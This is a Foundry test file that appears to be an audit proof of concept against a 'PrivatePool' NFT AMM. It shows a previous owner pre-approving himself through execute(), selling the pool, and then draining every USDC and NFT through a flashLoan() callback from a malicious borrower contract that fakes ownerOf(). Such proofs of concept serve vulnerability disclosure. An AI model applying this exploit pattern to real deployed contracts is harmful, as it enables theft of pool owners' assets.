// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";

/**
 * @title PrivatePool Exploit Test
 * @notice Demonstrates vulnerability where previous owner can steal assets via execute() and flashLoan()
 * 
 * Attack Flow:
 * 1. Bob creates a PrivatePool and deposits NFTs + USDC
 * 2. Bob uses execute() to approve himself for unlimited ERC20 and ERC721 transfers
 * 3. Bob sells the pool ownership to Alice
 * 4. Bob calls flashLoan() with a malicious contract
 * 5. During the flash loan callback, Bob steals all assets using pre-approved allowances
 * 6. Alice is left with an empty pool
 */
contract ExploitTest is Test {
    PrivatePool public privatePool;
    Factory public factory;
    MockERC20 public usdc;
    MockERC721 public nft;
    MaliciousFlashBorrower public exploitContract;
    
    address public bob = address(0xB0B);
    address public alice = address(0xA11CE);
    
    uint256[] public tokenIds;
    uint256 public constant INITIAL_USDC = 500e6; // 500 USDC (6 decimals)
    uint256 public constant NFT_COUNT = 5;
    
    function setUp() public {
        // Deploy mock tokens
        usdc = new MockERC20("USDC", "USDC", 6);
        nft = new MockERC721("TestNFT", "TNFT");
        
        // Deploy factory
        factory = new Factory();
        factory.initialize();
        
        // Setup Bob with initial funds
        vm.startPrank(bob);
        
        // Mint USDC to Bob
        usdc.mint(bob, INITIAL_USDC);
        
        // Mint NFTs to Bob
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            nft.mint(bob, i);
            tokenIds.push(i);
        }
        
        // Create PrivatePool via Factory
        privatePool = PrivatePool(payable(factory.create{value: 0}(
            address(usdc),      // baseToken
            address(nft),       // nft
            100e6,              // virtualBaseTokenReserves
            5e18,               // virtualNftReserves
            0,                  // changeFee
            200,                // feeRate (2%)
            bytes32(0),         // merkleRoot
            false,              // useStolenNftOracle
            false,              // payRoyalties
            bytes32(0),         // salt
            new uint256[](0),   // tokenIds (empty for now)
            0                   // baseTokenAmount (0 for now)
        )));
        
        // Approve pool to transfer Bob's tokens
        usdc.approve(address(privatePool), INITIAL_USDC);
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            nft.approve(address(privatePool), i);
        }
        
        // Deposit NFTs and USDC into the pool
        privatePool.deposit(tokenIds, INITIAL_USDC);
        
        vm.stopPrank();
    }
    
    function testExploit_StealAssetsAfterOwnershipTransfer() public {
        // ============================================
        // STEP 1: Bob sets up malicious approvals
        // ============================================
        console.log("=== STEP 1: Bob creates malicious approvals ===");
        
        vm.startPrank(bob);
        
        // Approve Bob for unlimited USDC spending from the pool
        bytes memory approveUSDC = abi.encodeWithSignature(
            "approve(address,uint256)",
            bob,
            type(uint256).max
        );
        privatePool.execute(address(usdc), approveUSDC);
        
        // Approve Bob as operator for all NFTs in the pool
        bytes memory approveNFT = abi.encodeWithSignature(
            "setApprovalForAll(address,bool)",
            bob,
            true
        );
        privatePool.execute(address(nft), approveNFT);
        
        console.log("Bob's USDC allowance from pool:", usdc.allowance(address(privatePool), bob));
        console.log("Bob is approved operator:", nft.isApprovedForAll(address(privatePool), bob));
        
        vm.stopPrank();
        
        // ============================================
        // STEP 2: Bob sells pool ownership to Alice
        // ============================================
        console.log("\n=== STEP 2: Ownership transfer to Alice ===");
        
        vm.prank(bob);
        factory.safeTransferFrom(bob, alice, uint160(address(privatePool)));
        
        address currentOwner = factory.ownerOf(uint160(address(privatePool)));
        console.log("New pool owner:", currentOwner);
        assertEq(currentOwner, alice, "Alice should be the new owner");
        
        // Record balances before attack
        uint256 poolUSDCBefore = usdc.balanceOf(address(privatePool));
        uint256 bobUSDCBefore = usdc.balanceOf(bob);
        
        console.log("\n=== Balances before attack ===");
        console.log("Pool USDC balance:", poolUSDCBefore);
        console.log("Pool NFT count:", NFT_COUNT);
        console.log("Bob USDC balance:", bobUSDCBefore);
        console.log("Bob NFT count:", 0);
        
        // ============================================
        // STEP 3: Deploy malicious flash loan contract
        // ============================================
        console.log("\n=== STEP 3: Bob deploys exploit contract ===");
        
        vm.prank(bob);
        exploitContract = new MaliciousFlashBorrower(
            address(privatePool),
            address(usdc),
            address(nft),
            tokenIds,
            bob
        );
        
        // ============================================
        // STEP 4: Execute the attack via flashLoan
        // ============================================
        console.log("\n=== STEP 4: Execute attack via flashLoan ===");
        
        vm.prank(bob);
        // Call flashLoan with the malicious contract as both receiver and token
        // This bypasses the NFT ownership check because the malicious contract
        // implements ownerOf() to return address(this)
        privatePool.flashLoan(
            IERC3156FlashBorrower(address(exploitContract)),
            address(exploitContract), // Fake token address
            0,                        // Arbitrary tokenId
            ""                        // Empty data
        );
        
        // ============================================
        // STEP 5: Verify the exploit succeeded
        // ============================================
        console.log("\n=== STEP 5: Verify exploit results ===");
        
        uint256 poolUSDCAfter = usdc.balanceOf(address(privatePool));
        uint256 bobUSDCAfter = usdc.balanceOf(bob);
        
        console.log("Pool USDC balance:", poolUSDCAfter);
        console.log("Bob USDC balance:", bobUSDCAfter);
        
        // Verify all USDC was stolen
        assertEq(poolUSDCAfter, 0, "Pool should have 0 USDC");
        assertEq(bobUSDCAfter, INITIAL_USDC, "Bob should have stolen all USDC");
        
        // Verify all NFTs were stolen
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            address nftOwner = nft.ownerOf(i);
            assertEq(nftOwner, bob, "Bob should own all NFTs");
        }
        
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Bob stole:", INITIAL_USDC / 1e6, "USDC and", NFT_COUNT, "NFTs");
        console.log("Alice lost everything despite being the current owner");
    }
}

/**
 * @notice Malicious flash loan borrower that steals assets during callback
 */
contract MaliciousFlashBorrower is IERC3156FlashBorrower {
    address public privatePool;
    address public usdc;
    address public nft;
    uint256[] public tokenIds;
    address public attacker;
    
    constructor(
        address _privatePool,
        address _usdc,
        address _nft,
        uint256[] memory _tokenIds,
        address _attacker
    ) {
        privatePool = _privatePool;
        usdc = _usdc;
        nft = _nft;
        tokenIds = _tokenIds;
        attacker = _attacker;
    }
    
    /**
     * @notice Flash loan callback - executes the theft
     */
    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // Steal all USDC using pre-approved allowance
        uint256 usdcBalance = ERC20(usdc).balanceOf(privatePool);
        if (usdcBalance > 0) {
            ERC20(usdc).transferFrom(privatePool, attacker, usdcBalance);
        }
        
        // Steal all NFTs using pre-approved operator status
        for (uint256 i = 0; i < tokenIds.length; i++) {
            ERC721(nft).transferFrom(privatePool, attacker, tokenIds[i]);
        }
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    /**
     * @notice Fake ownerOf to pass flash loan availability check
     */
    function ownerOf(uint256) external view returns (address) {
        return privatePool;
    }
    
    /**
     * @notice Fake safeTransferFrom - does nothing
     */
    function safeTransferFrom(address, address, uint256) external pure {
        // Do nothing - fake transfer
    }
    
    /**
     * @notice Required to receive NFTs during fake transfers
     */
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/**
 * @notice Mock ERC20 token for testing
 */
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) 
        ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @notice Mock ERC721 token for testing
 */
contract MockERC721 is ERC721 {
    constructor(string memory name, string memory symbol) 
        ERC721(name, symbol) {}
    
    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}
